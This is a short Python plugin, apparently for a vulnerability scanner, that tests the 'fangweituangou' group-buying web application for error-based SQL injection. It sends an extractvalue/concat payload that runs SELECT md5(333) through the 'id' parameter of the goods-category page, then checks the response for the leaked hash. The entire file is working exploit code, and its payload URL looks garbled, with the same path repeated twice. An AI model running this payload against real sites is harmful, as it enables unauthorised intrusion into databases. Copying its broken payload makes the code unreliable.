#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Tian.Te
def assign(service,arg):
    if service == "fangweituangou":
        return True, arg

def audit(arg):
    payload = "index.php?m=Goods&a=showcate&id=103index.php?m=Goods&a=showcate&id=103%20and%20extractvalue(1,%20concat(0x7e,(SELECT%20md5(333))))"
    target = arg + payload
    code, head, res,errcode,_ = curl.curl('"%s"' % target)
    if code == 200:
        if "310dcbbf4cce62f762a2aaa148d556b" in res:
            security_hole(target)

if __name__ == "__main__":
    from dummy import *
    audit(assign('fangweituangou', 'http://www.example.com/')[1])
